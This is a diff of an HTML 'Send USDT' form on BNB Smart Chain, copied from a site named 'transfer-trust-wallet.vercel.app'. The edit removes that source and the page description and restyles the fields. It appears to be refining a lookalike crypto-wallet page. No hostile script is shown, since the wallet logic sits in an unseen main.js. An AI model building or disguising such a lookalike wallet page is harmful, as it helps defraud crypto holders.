@@ -1,9 +1,8 @@
 <!DOCTYPE html>
-<html data-scrapbook-source="https://transfer-trust-wallet.vercel.app/" data-scrapbook-create="20250612175515756" data-scrapbook-title="Transfer Trust Wallet">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Transfer Trust Wallet</title>
-  <meta name="description" content="Securely transfer USDT on Binance Smart Chain">
+  <title>Send USDT</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="icon" href="favicon.ico">
   <link rel="stylesheet" href="style.css">
@@ -14,6 +13,7 @@
     <div>
       <div class="min-h-screen bg-[#1b1b1b] text-gray-300 p-4 max-w-md mx-auto">
 
+        <!-- Header -->
         <header class="flex w-full items-center mb-8">
           <h1 class="flex-1 text-center text-xl font-medium text-white">
             Send USDT
@@ -30,22 +30,45 @@
                 placeholder="Search or Enter"
                 class="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-32"
               >
-              <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
-                <button class="text-greentext h-8 px-2">Paste</button>
-                <button class="text-greentext h-8 w-8">📄</button>
-                <button class="text-greentext h-8 w-8">📷</button>
+              <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-2">
+                <button class="text-greentext text-sm font-medium">Paste</button>
+                <button class="text-greentext w-8 h-8">📄</button>
+                <button class="text-greentext w-8 h-8">📷</button>
               </div>
             </div>
           </div>
 
-          <!-- ✅ ADDED SECTION (ONLY THIS PART IS NEW) -->
+          <!-- Destination Network (ADDED ONLY THIS) -->
+          <div class="space-y-1">
+            <label class="text-sm text-gray-400">Destination network</label>
 
+            <div
+              class="inline-flex items-center gap-2
+                     h-[40px]
+                     px-3
+                     rounded-full
+                     border border-gray-800
+                     bg-[#1f1f1f]
+                     text-[15px]
+                     text-gray-300
+                     font-medium"
+            >
+              <!-- BNB ICON -->
+              <div
+                class="w-6 h-6 rounded-full overflow-hidden bg-[#2b2b2b]
+                       flex items-center justify-center"
+              >
+                <img
+                  src="BNB.png"
+                  alt="BNB"
+                  class="w-full h-full object-cover"
+                >
+              </div>
 
-  <div class="space-y-1"> <label class="text-sm text-gray-400">Destination network</label> <br> <div class="inline-flex items-center gap-2 rounded-full border border-gray-800 bg-[#1b1b1b] px-2 py-2 text-sm text-gray-300"> <span>🟡</span> <span>BNB Smart Chain</span> <span class="ml-1">▾</span> </div> </div>.
-
-
-          
-          <!-- ✅ END ADDED SECTION -->
+              <span class="leading-none">BNB Smart Chain</span>
+              <span class="ml-1 text-gray-500 leading-none">▾</span>
+            </div>
+          </div>
 
           <!-- Amount -->
           <div class="space-y-1">
@@ -56,9 +79,9 @@
                 type="number"
                 class="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-24"
               >
-              <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
-                <span class="text-gray-500 text-sm mr-2">USDT</span>
-                <button class="text-greentext h-8">Max</button>
+              <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-2">
+                <span class="text-gray-500 text-sm">USDT</span>
+                <button class="text-greentext text-sm font-medium">Max</button>
               </div>
             </div>
           </div>
@@ -66,8 +89,12 @@
           <div class="text-xs text-gray-500">≈ $0.00</div>
         </div>
 
+        <!-- Bottom Button -->
         <div class="fixed bottom-8 left-4 right-4 max-w-md mx-auto">
-          <button class="w-full bg-greentext text-black rounded-full h-12 text-lg" disabled>
+          <button
+            class="w-full bg-greentext text-black rounded-full h-12 text-lg"
+            disabled
+          >
             Next
           </button>
         </div>
@@ -76,7 +103,7 @@
     </div>
   </div>
 
-  <!-- ORIGINAL SCRIPTS – UNTOUCHED -->
+  <!-- ORIGINAL SCRIPTS (UNTOUCHED) -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
   <script>
@@ -90,19 +117,4 @@
   <script src="main.js"></script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
